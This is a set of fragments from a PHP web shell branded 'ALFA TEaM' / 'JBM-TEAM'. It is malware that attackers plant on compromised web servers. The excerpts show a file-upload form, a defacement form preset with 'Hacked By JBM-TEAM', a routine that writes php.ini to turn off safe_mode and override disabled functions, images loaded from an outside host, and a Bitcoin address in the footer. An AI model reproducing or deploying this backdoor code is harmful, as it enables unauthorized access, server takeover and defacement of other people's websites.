...
define("__ALFA_CODE_NAME__", "JBM-TEAM Srv");
...
<center><img style="border-radius:100px;" width="150" height="150" alt="alfa team 2012" draggable="false" src="https://storage.dk-only.site/shell-assest/team.png" /></center>
...
<style type="text/css">';?>
@keyframes rotateNeon{100%{filter:hue-rotate(0deg);transform:rotate(360deg)}}.header,#meunlist,.foot{position:relative;border:none !important;background:#000 !important;z-index:0;overflow:hidden;padding:5px}.header::before,#meunlist::before,.foot::before{content:'';position:absolute;z-index:-2;left:-50%;top:-50%;width:200%;height:200%;background-color:#000;background-repeat:no-repeat;background-size:50% 50%,50% 50%;background-position:0 0,100% 0,100% 100%,0 100%;background-image:conic-gradient(transparent, #ffb000, #ff0000, #dedede, #43d2ff, #ffb000, #000eff, transparent 30%);animation:rotateNeon 4s linear infinite}.header::after,#meunlist::after,.foot::after{content:'';position:absolute;z-index:-1;left:3px;top:3px;width:calc(100% - 6px);height:calc(100% - 6px);background:linear-gradient(to top, #000000 0, #1b1b1b 50%, #1b1b1b 65%, #000000 100%);border-radius:2px}@keyframes neonPulseAndRotate{0%{transform:scale(1) rotate(0deg);filter:drop-shadow(0 0 5px #ffffff) drop-shadow(0 0 10px #ffffff)}25%{transform:scale(1.1) rotate(0deg);filter:drop-shadow(0 0 20px #ffffff) brightness(1.2)}50%{transform:scale(1) rotate(360deg);filter:drop-shadow(0 0 5px #ffffff)}75%{transform:scale(1.1) rotate(360deg);filter:drop-shadow(0 0 20px #ffffff) brightness(1.2)}100%{transform:scale(1) rotate(360deg);filter:drop-shadow(0 0 5px #ffffff) drop-shadow(0 0 10px #ffffff)}}img[src*="team.png"]{display:block;margin:0 auto;position:relative;z-index:10;animation:neonPulseAndRotate 5s ease-in-out infinite;backface-visibility:hidden;-webkit-font-smoothing:antialiased}img[src*="team.png"]:hover{animation-play-state:paused;filter:drop-shadow(0 0 30px #51ff00) brightness(1.5);cursor:pointer}
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="180" height="180" alt="alfa team 2012" draggable="false" src="https://storage.dk-only.site/shell-assest/team.png" /></td>
</tr>
<tr>
...
<font color='#00A220'>Shell Coded By JBM-TEAM (ALFA TEaM)</font><br>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./SERVER SHELL &copy; 2025-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #ffffffff;text-decoration: none;'>Powered By </a></span> <span style='letter-spacing: 2px;color: #FFF;'>JBM TEAM</span> <span><a style='color: #ffffffff;text-decoration: none;' target='_blank' href='https://dk-only.site/'>2026</a></span></div></td>
</tr>
</table>
</div>
...
<textarea name=index rows='19' cols='103'><title>Hacked By JBM-TEAM</title><b>Hacked By JBM-TEAM</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By JBM-TEAM</title><b>Hacked By JBM-TEAM</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By JBM-TEAM(ALFA TEaM)");
